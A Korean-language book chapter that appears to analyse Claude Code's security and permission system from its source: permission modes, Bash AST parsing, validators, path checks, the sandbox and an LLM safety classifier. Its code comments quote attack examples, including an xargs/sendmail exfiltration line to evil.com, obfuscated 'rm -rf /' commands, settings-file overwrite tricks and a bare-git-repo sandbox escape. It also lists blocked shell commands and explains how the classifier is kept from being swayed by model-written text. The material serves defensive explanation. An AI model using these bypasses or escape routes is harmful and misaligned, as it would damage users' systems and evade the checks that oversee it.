# 제 10 장：보안 및 권한 모델

## 10.1 개요 및 위치

Claude Code의 보안 모델은 전체 시스템에서 코드 양이 가장 많고 복잡도가 가장 높은 하위 시스템으로, 약 25,000줄의 TypeScript 소스 코드를 포함한다. 이것이 해결하는 핵심 문제는: **AI 에이전트에게 shell 명령을 실행하고 파일을 수정하는 능력을 부여하면서, 악의적인 명령 주입, 데이터 유출, 시스템 파괴를 방지하는 방법은 무엇인가**.

전통적인 IDE 플러그인과 달리, Claude Code는 독특한 위협 모델에 직면한다: AI 모델 자체가 prompt injection에 의해 위험한 작업을 실행하도록 유도될 수 있고, 사용자가 코드베이스에 클론한 악의적인 저장소가 파일명이나 내용을 통해 공격 벡터를 구성할 수 있다. 보안 시스템은 **모델 출력**과 **운영 체제** 사이에 신뢰할 수 있는 검증 층을 구축해야 한다.

전체 보안 하위 시스템을 하나의 공식으로 요약할 수 있다:

```
최종 결정 = f(권한 모드, 규칙 매칭, AST 분석, 보안 검증기, 경로 검증, 분류기, Hook, 샌드박스)
```

이것은 단층 필터가 아니라 8층의 종심 방어(Defense in Depth) 체계로, 각 층은 독립적으로 사용 가능하며 층층이 쌓인다.

## 10.2 이론적 기반

### 10.2.1 최소 권한 원칙(Principle of Least Privilege)

Claude Code는 기본적으로 모든 쓰기 작업을 거부한다——모든 도구 호출은 `checkPermissions`를 통해 승인을 받아야 한다. 권한 모드는 가장 엄격한 것(`default`——매번 질문)에서 가장 느슨한 것(`bypassPermissions`)까지 범위가 있으며, 사용자가 능동적으로 신뢰 수준을 선택한다.

### 10.2.2 샌드박스 모델(Sandboxing)

`@anthropic-ai/sandbox-runtime`을 통합하여, macOS에서는 `sandbox-exec`, Linux에서는 `bubblewrap`(bwrap)을 사용하여 운영 체제 수준에서 파일 시스템과 네트워크 접근을 격리한다. 샌드박스는 애플리케이션 층의 권한 검사와 독립적이다——애플리케이션 층이 잘못 판단하더라도, OS 층이 여전히 차단한다.

### 10.2.3 보안 영역에서의 AST 분석 적용

전통적인 정규식 매칭과 달리, Claude Code는 완전한 Bash AST 파싱(순수 TypeScript로 구현된 tree-sitter 호환 파서)을 사용하여 명령 구조를 이해한다. 이것이 보안 검증의 초석이다——정규식은 `echo "rm -rf /"` 와 `rm -rf /`를 구별할 수 없지만, AST는 할 수 있다.

### 10.2.4 종심 방어(Defense in Depth)

보안 검사는 8개의 독립적인 층에 분산되어 있으며, 어느 한 층이 차단해도 위험한 작업을 막을 수 있다. 공격자가 AST 파싱을 우회하더라도(예: parser differential을 악용), 경로 검증, 샌드박스, 사용자 확인이 대안으로 남아 있다.

## 10.3 권한 모델 아키텍처

### 10.3.1 5단계 권한 모드

권한 모드는 `utils/permissions/PermissionMode.ts`에 정의되어 있으며, 실제 실행 시에는 5단계다:

| 모드 | 동작 | 적용 시나리오 |
|------|------|----------|
| `default` | 모든 도구 호출 시 사용자에게 질문 | 첫 사용, 고위험 환경 |
| `acceptEdits` | 파일 편집 자동 통과, 명령은 여전히 확인 필요 | 일상 개발 |
| `plan` | 계획만 생성하고 실행 안 함 | 아키텍처 설계, 코드 리뷰 |
| `auto` | LLM 분류기가 자동 결정 | 고신뢰 개발자 |
| `bypassPermissions` | 모든 권한 검사 건너뜀 | 완전 신뢰 시나리오(정책으로 비활성화 가능) |

모드 전환 시 완전한 상태 전환 로직이 있다(`permissionSetup.ts:transitionPermissionMode`):

- `auto` 모드 진입 시, 위험한 권한 규칙 자동 제거(`stripDangerousPermissionsForAutoMode`)
- `auto` 모드 종료 시, 제거된 규칙 복원(`restoreDangerousPermissions`)
- `plan` 모드는 `auto` 모드 내포 가능(plan + auto-during-plan)

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 권한 규칙 시스템

권한 규칙(Permission Rules)은 세밀한 제어의 핵심으로, 다중 수준 설정에 저장된다:

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

각 규칙은 세 가지 차원을 포함한다:
- **Source**(출처 수준): policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior**(동작): `allow` / `deny` / `ask`
- **RuleValue**(매칭 패턴): 예: `Bash(git commit:*)`는 모든 `git commit`으로 시작하는 명령을 허용

규칙 매칭은 세 가지 패턴을 지원한다:
1. **도구 수준 매칭**: `Bash`는 모든 Bash 명령과 매칭
2. **접두사 매칭**: `Bash(npm run:*)`는 `npm run`으로 시작하는 명령과 매칭
3. **정확 매칭**: `Bash(ls -la)`는 이 명령만 매칭

### 10.3.3 권한 계단식의 완전한 흐름

Bash 명령 하나의 권한 확인은 `bashToolHasPermission`(`bashPermissions.ts`)을 통과하며, 완전한 경로는 다음과 같다:

```
1. 모드 확인 → bypassPermissions는 직접 통과
2. deny 규칙 매칭 → 매칭되면 거부
3. allow 규칙 매칭 → 매칭되면 허용
4. 보안 모드 확인 → acceptEdits 등 모드 특수 처리
5. 명령 AST 파싱 → tree-sitter가 구조화된 명령 생성
6. 보안 검증기 체인 → 23가지 정적 검사
7. 읽기 전용 검증 → 명령 화이트리스트 + flag 화이트리스트
8. 경로 검증 → 작업 디렉터리 제약
9. LLM 분류기(선택적) → auto 모드에서의 AI 결정
10. 사용자 확인 → 최종 안전망
```

## 10.4 Bash 명령 보안——8단계 분류 흐름

### 10.4.1 Tree-sitter AST 파싱

이것이 전체 보안 시스템의 가장 핵심적인 혁신이다. `utils/bash/ast.ts`는 AST 기반 bash 명령 분석을 구현한다:

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

AST 파싱의 출력 유형:

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

핵심 설계: **Fail-Closed + Allowlist**. allowlist에 없는 AST 노드 유형은 전체 명령을 `too-complex`로 표시하여 사용자 확인을 요구한다. `DANGEROUS_TYPES` 집합은 알려진 위험한 노드 유형을 정의한다:

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // $() 명령 치환
  'process_substitution',   // <() >() 프로세스 치환
  'expansion',              // 파라미터 확장
  'subshell',               // 서브셸
  'for_statement',          // 제어 흐름
  'if_statement',
  'function_definition',
  'brace_expression',       // 중괄호 확장
  // ... 총 18종
])
```

### 10.4.2 순수 TypeScript Bash 파서

`utils/bash/bashParser.ts`(4,436줄)는 완전한 Bash 문법 파서로, tree-sitter-bash WASM 파서와 호환되는 AST를 생성한다. 핵심 설계 파라미터:

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // 50ms 타임아웃, 악의적 입력 방지
const MAX_NODES = 50_000       // 노드 수 상한, OOM 방지
```

파서는 heredoc, ANSI-C 문자열, 프로세스 치환 등을 포함한 완전한 Bash 문법을 지원한다. 타임아웃이나 노드 폭발 시 직접 `null`을 반환한다——fail-closed.

### 10.4.3 LLM 분류기(Bash Classifier)

`auto` 모드에 사용된다. `bashClassifier.ts`는 세 그룹의 명령 설명 규칙을 유지한다:

- **Allow descriptions**: 어떤 명령이 안전한지 설명(예: "git read-only operations")
- **Deny descriptions**: 어떤 명령이 위험한지 설명(예: "commands that download and execute code")
- **Ask descriptions**: 사용자 확인이 필요한 패턴

분류기는 `sideQuery`를 사용하여 독립적인 Claude 인스턴스를 호출하며, 메인 대화와 완전히 격리된다.

### 10.4.4 환경 변수 필터링

`bashPermissions.ts`는 두 그룹의 안전한 환경 변수 화이트리스트를 정의한다:

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... 총 ~40개
])
```

**보안 주석이 특히 가치 있다**——소스 코드가 화이트리스트에 절대 추가해서는 **안 되는** 변수를 명시적으로 표시:

```typescript
// bashPermissions.ts:~385 (주석)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23개 Shell 보안 검증기

`bashSecurity.ts`는 각각 고유한 숫자 ID를 가진 23개의 독립적인 검증기를 구현한다:

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

주목할 만한 검증기 몇 가지:

**명령 치환 감지**——`$()`만 감지하는 것이 아니라 Zsh 특유의 공격 면도 커버한다:

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... PowerShell 주석 문법에 대한 방어적 차단도 포함
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Zsh 위험 명령 차단**——`zmodload`는 Zsh 모듈 시스템의 진입점으로, `zsh/system`(파일 I/O), `zsh/net/tcp`(네트워크 통신) 등의 모듈을 로드할 수 있다:

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // 모듈 로드 진입점
  'emulate',    // -c flag는 eval 동등물
  'sysopen', 'sysread', 'syswrite',  // zsh/system 모듈
  'zpty',       // 가상 터미널 명령 실행
  'ztcp',       // TCP 네트워크 통신
  'zf_rm', 'zf_mv', 'zf_chmod',     // zsh/files 내장 명령
  // ...
])
```

### 10.4.6 읽기 전용 검증 메커니즘

`readOnlyValidation.ts`는 **명령 화이트리스트 + Flag 화이트리스트** 체계를 유지한다. `COMMAND_ALLOWLIST`를 핵심으로:

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // 주의: -i와 -e는 GNU getopt optional-arg 의미론 차이로 제거됨
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R 제거: tree -R -H은 파일을 씀
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... 총 약 30개 명령
}
```

각 명령의 Flag 화이트리스트에는 상세한 보안 주석이 있다. 예를 들어 `xargs`의 `-i`가 제거된 이유:

```typescript
// readOnlyValidation.ts:~130 (주석)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

이 수준의 보안 분석——GNU getopt의 optional-arg 의미론 차이로 인한 파서 differential을 이해하는——이 전체 보안 모델에서 가장 인상적인 부분이다.

### 10.4.7 경로 검증과 순회 방지

`pathValidation.ts`(1,303줄)는 완전한 경로 보안 체계를 구현한다:

**경로 추출기**——34종의 명령에 전용 인수 파서를 정의:

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* 복잡한 flag/path 분리 로직 */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* git diff --no-index 특수 처리 */ },
  // ... 총 34종 명령
}
```

**POSIX `--` 처리**——end-of-options 구분자를 올바르게 처리하여 `-path` 류 인수가 경로 검증을 우회하는 것을 방지:

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// 여기서 `-/../.claude/settings.local.json`은 `-`로 시작하는데,
// `--`를 처리하지 않으면 naive한 !arg.startsWith('-') 필터가 이를 버려
// 검증이 0개의 경로를 보고 passthrough를 반환하여 파일이 삭제된다.
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**위험 삭제 경로 보호**——allowlist 규칙이 있더라도, `/`, `/etc`, `/home` 등 핵심 경로에 대한 rm 작업은 항상 사용자 확인이 필요하다:

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**cd + 쓰기 작업 조합 공격 방지**:

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 FileEdit 검증 체인

FileEditTool의 검증 체인은 `FileEditTool.ts`의 `validateInput` 메서드에 구현되어 있으며, 총 12단계다:

| 단계 | 검사 항목 | 소스 코드 위치 |
|------|--------|----------|
| 1 | Team Memory Secret 감지 | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | old_string === new_string 변경 없음 확인 | errorCode: 1 |
| 3 | Deny 규칙 매칭 | `matchingRuleForInput(..., 'deny')` |
| 4 | UNC 경로 보안 확인(NTLM 유출 방지) | `fullFilePath.startsWith('\\\\')` |
| 5 | 파일 크기 제한(1 GiB) | `MAX_EDIT_FILE_SIZE` |
| 6 | 파일 인코딩 감지 및 읽기 | UTF-8 / UTF-16LE |
| 7 | 파일 존재 여부 검증 | 없으면 old_string은 반드시 비어 있어야 함 |
| 8 | Jupyter Notebook 차단 | NotebookEditTool 사용 안내 |
| 9 | **Must-Read-Before-Write** 확인 | `readFileState.get(fullFilePath)` |
| 10 | **mtime 동시 수정 감지** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **유일성 확인** | 다중 매칭 시 `replace_all: true` 요구 |
| 12 | Settings 파일 특수 검증 | `validateInputForSettingsFileEdit` |

단계 9와 10이 **"선 읽기 후 쓰기"** 불변량을 구성한다:

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Windows 특수 처리: 클라우드 동기화/안티바이러스가 mtime을 바꿀 수 있으나 내용은 변경 안 됨
  if (isFullRead && fileContent === readTimestamp.content) {
    // 내용 미변경, 안전하게 통과
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 샌드박스 메커니즘

### 10.6.1 샌드박스 어댑터 아키텍처

`utils/sandbox/sandbox-adapter.ts`(985줄)는 `@anthropic-ai/sandbox-runtime`의 어댑터 층으로, Claude Code의 설정 시스템을 샌드박스 런타임 설정에 매핑한다:

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // 항상 settings 파일 쓰기 거부——샌드박스 탈출 방지
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // .claude/skills 쓰기 거부——동등한 권한 수준
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // 裸 Git 저장소 공격 방지
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 裸 Git 저장소 공격 방지

이것은 정교한 보안 조치다. 공격자는 cwd에 `HEAD`, `objects/`, `refs/` 파일을 심어 Git의 `is_git_directory()`가 cwd를 裸 저장소로 잘못 판단하도록 만들고, 그 다음 `core.fsmonitor` 설정을 통해 임의 코드를 실행할 수 있다:

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// 전략: 이미 존재하는 파일은 읽기 전용 바인드로 설정, 없는 파일은 명령 실행 후 정리
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT는 정상적인 상황 */ }
  }
}
```

### 10.6.3 네트워크 격리 전략

샌드박스는 도메인 수준의 네트워크 제어를 지원하며, WebFetch 도구의 권한 규칙에서 허용된 도메인을 추출한다:

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

기업 정책은 `allowManagedDomainsOnly`를 통해 관리자가 설정한 도메인만 사용하도록 강제할 수 있다.

## 10.7 Hook 시스템과 권한 상호작용

### 10.7.1 PreToolUse / PostToolUse Hook

Hook 시스템은 사용자가 맞춤형 보안 로직을 주입할 수 있게 한다. `interactiveHandler.ts`는 Hook이 권한 결정과 어떻게 경쟁하는지 보여준다:

```typescript
// interactiveHandler.ts:~68
// 네 방향 경쟁: 사용자 상호작용 / Hook / 분류기 / Bridge(CCR)
// claim() 원자 작업으로 하나의 승자만 있도록 보장
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 권한 결정의 동시 경쟁 모델

`PermissionContext.ts`는 `createResolveOnce`를 정의한다——"claim-then-resolve" 패턴으로, 여러 비동기 출처(사용자 UI, Hook, 분류기, Bridge, Channel)가 경쟁할 때 하나의 승자만 있도록 보장한다:

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

이 설계는 여섯 방향의 동시 경쟁을 지원한다:
1. **로컬 UI** — 사용자가 터미널에서 Allow/Deny 클릭
2. **Hook** — PreToolUse hook이 결정 반환
3. **Bash Classifier** — LLM 분류기가 안전 판단
4. **Bridge (CCR)** — Claude.ai Web UI 원격 결정
5. **Channel** — Telegram/iMessage 등 채널 응답
6. **Recheck** — 규칙 변경 후 자동 재확인

## 10.8 YOLO 분류기(Auto Mode Classifier)

### 10.8.1 아키텍처

`yoloClassifier.ts`(1,495줄)는 `auto` 모드의 AI 보안 분류기를 구현한다. 이것은 `sideQuery`를 통해 호출되는 독립적인 Claude 인스턴스로, 메인 대화와 완전히 격리된다:

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 두 단계 XML 분류기

분류기는 세 가지 실행 모드(`both` / `fast` / `thinking`)를 지원하며, 기본적으로 두 단계 전략을 사용한다:

- **1단계(fast)**: max_tokens=64, nudge가 즉시 yes/no 결정을 내린다. 안전하다고 판단하면 직접 반환.
- **2단계(thinking)**: 1단계가 "block"으로 판단했을 때만 트리거되며, chain-of-thought 추론을 사용하여 false positive를 줄인다.

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Transcript 압축

분류기는 완전한 대화 기록을 받지 않고, `buildTranscriptEntries`를 통해 대화를 압축 형식으로 변환한다——사용자 텍스트와 assistant의 tool_use 블록만 보존하며(assistant 텍스트는 분류기에 영향을 줄 수 있도록 구성될 수 있기 때문에 제외):

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 빠른 경로 최적화

분류기를 호출하기 전에 LLM 호출을 건너뛸 수 있는 세 가지 빠른 경로가 있다:

1. **acceptEdits 시뮬레이션**: 명령이 `acceptEdits` 모드에서 자동 허용되었을 경우, 직접 통과
2. **안전 도구 화이트리스트**: `isAutoModeAllowlistedTool`이 알려진 안전한 도구 집합을 유지
3. **거부 추적**: 연속 거부 횟수가 너무 많으면 사용자에게 직접 질문으로 폴백

### 10.8.5 위험 권한 제거

`auto` 모드 진입 시, 다음 권한 규칙들이 자동으로 제거된다(`stripDangerousPermissionsForAutoMode`):

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — 모든 명령 허용
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — 스크립트 인터프리터
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

이는 사용자가 이전에 `Bash(python:*)` 같은 광범위한 규칙을 저장했더라도, `auto` 모드에서는 분류기를 우회하지 않도록 보장한다.

## 10.9 설계 결정 분석

### 10.9.1 정규식 대신 AST 파싱을 사용하는 이유

정규식은 **parser differential** 공격을 처리할 수 없다. 예를 들어:

```bash
echo "rm -rf /"   # 정규식이 오보할 것——이것은 단지 echo의 인수일 뿐
rm -rf /           # 정규식이 감지해야 할 것
```

더 위험한 것은 **인용 중첩**과 **shell 확장**이다:

```bash
ev"al" 'rm -rf /'    # 정규식이 eval을 못 볼 수 있음
$'\x65\x76\x61\x6c' 'rm -rf /'  # ANSI-C 문자열로 인코딩된 eval
```

AST 파서는 문법 구조를 이해하여 명령명과 인수를 올바르게 구별할 수 있다. 그리고 fail-closed 설계는 파싱할 수 없는 모든 구조에 사용자 확인을 요구함을 의미한다.

### 10.9.2 LLM 분류기의 도입 시점과 트레이드오프

분류기는 `auto` 모드에서만 사용되며, 엄격한 비용 제어가 있다:

- **지연**: 두 단계 설계, 1단계는 보통 <100ms(max_tokens=64 + prompt cache)
- **비용**: `sideQuery`를 사용하여 독립 API 호출, 메인 대화의 토큰 소비에 포함 안 됨
- **정확도**: 2단계의 chain-of-thought가 false positive를 합리적인 수준으로 낮춤
- **신뢰성**: 분류기를 사용할 수 없을 때 fail-closed(사용자에게 질문으로 폴백)

### 10.9.3 보안 vs 사용성의 균형

Claude Code는 **점진적 신뢰**(progressive trust)를 통해 두 가지를 균형 잡는다:

1. 첫 사용: 모든 명령 확인 필요
2. 규칙 저장 후: 매칭되는 명령 자동 통과
3. `acceptEdits` 모드: 파일 편집 자동 통과
4. `auto` 모드: AI 분류기 판단
5. `bypassPermissions`: 완전 신뢰

동시에 **지능적 제안**(`suggestionForExactCommand` / `suggestionForPrefix`)을 통해 사용자가 점진적으로 신뢰 규칙을 구축하도록 안내하며, 한 번에 다 해결하려 하지 않는다.

### 10.9.4 경쟁 제품 보안 모델과의 비교

| 차원 | Claude Code | Cursor | GitHub Copilot |
|------|------------|--------|----------------|
| 명령 분석 | AST 파싱 + 23 검증기 | 기본 정규식 | 명령 실행 안 함 |
| 샌드박스 | OS 수준(sandbox-exec/bwrap) | 없음 | N/A |
| 권한 모델 | 5단계 + 세밀한 규칙 | 이진(허용/거부) | N/A |
| AI 분류기 | 독립 LLM 인스턴스 | 없음 | 없음 |
| 경로 검증 | 34종 명령 전용 파서 | 기본 검사 | N/A |
| 기업 정책 | policySettings 층 | 제한적 | 조직 정책 |

## 10.10 이식 가능한 패턴

1. **Fail-Closed Allowlist 패턴**: AST 파싱의 핵심 원칙——알려진 안전한 구조만 이해하고, 나머지는 모두 거부. 신뢰할 수 없는 입력을 파싱해야 하는 모든 시나리오에 적용 가능.

2. **Claim-then-Resolve 동시성 패턴**: `createResolveOnce`가 여러 비동기 출처가 결정을 경쟁하는 문제를 해결. "첫 번째 도착한 결정자가 이긴다"가 필요한 모든 시나리오에서 재사용 가능.

3. **점진적 신뢰 업그레이드**: 가장 엄격한 모드에서 시작하여, 사용자 행동을 통해 점진적으로 신뢰 규칙을 구축. "처음부터 신뢰 수준을 선택해야 한다"는 것보다 인간 심리에 더 부합.

4. **분류기 빠른 경로 + 두 단계**: 먼저 규칙/화이트리스트/시뮬레이션으로 명백히 안전한 작업을 건너뛰고, 불확실한 것에만 LLM을 호출. 두 단계 전략(fast + thinking)이 지연과 정확도 사이의 균형을 잡음.

5. **Parser Differential 방어**: 자신의 파서만 사용하는 것이 아니라, 체계적으로 shell 특성 차이(GNU vs BSD getopt, Zsh vs Bash 확장 규칙)를 검사. 이 사고 방식은 여러 층의 인터프리터를 포함하는 모든 시스템에 이식 가능.

6. **권한 규칙의 출처 계층**: 다중 수준 설정 병합(policy > flag > local > project > user > session), 기업 정책이 항상 우선. 일반적인 설정 우선순위 모델.

7. **샌드박스 + 애플리케이션 층 이중 보험**: 애플리케이션 층 권한 검사가 우회되더라도 OS 샌드박스가 여전히 차단——그 반대도 마찬가지. 두 층이 독립적으로 실패.

## 10.11 소스 코드 인덱스

| 파일 | 줄수 | 핵심 기능 |
|------|------|----------|
| `tools/BashTool/bashPermissions.ts` | 2,621 | Bash 권한 결정 주 진입점, 규칙 매칭, 명령 접두사 추출 |
| `tools/BashTool/bashSecurity.ts` | 2,592 | 23개 보안 검증기, 인용 파싱, 명령 치환 감지 |
| `tools/BashTool/readOnlyValidation.ts` | 1,990 | 명령 화이트리스트, Flag 화이트리스트, 읽기 전용 검증 |
| `tools/BashTool/pathValidation.ts` | 1,303 | 34종 명령의 경로 추출기, 위험 경로 감지 |
| `tools/BashTool/BashTool.tsx` | 1,143 | Bash 도구 진입점, 입력 스키마, 실행 로직 |
| `tools/BashTool/prompt.ts` | 369 | Bash 도구 프롬프트, 샌드박스 설명 |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | 파일 편집 12단계 검증 체인 |
| `utils/permissions/permissions.ts` | 1,486 | 권한 결정 총 진입점, 규칙 매칭, auto 모드 통합 |
| `utils/permissions/permissionSetup.ts` | 1,532 | 권한 모드 설정, 위험 규칙 감지 및 제거 |
| `utils/permissions/yoloClassifier.ts` | 1,495 | Auto 모드 LLM 분류기, 두 단계 XML 프로토콜 |
| `utils/permissions/filesystem.ts` | 1,777 | 파일 시스템 권한, 경로 보안, Claude 설정 보호 |
| `utils/bash/ast.ts` | 2,679 | Bash AST 분석, allowlist 노드 순회 |
| `utils/bash/bashParser.ts` | 4,436 | 순수 TypeScript Bash 파서 |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | 인터랙티브 권한 처리, 여섯 방향 경쟁 모델 |
| `hooks/toolPermission/PermissionContext.ts` | 388 | 권한 컨텍스트, claim-then-resolve |
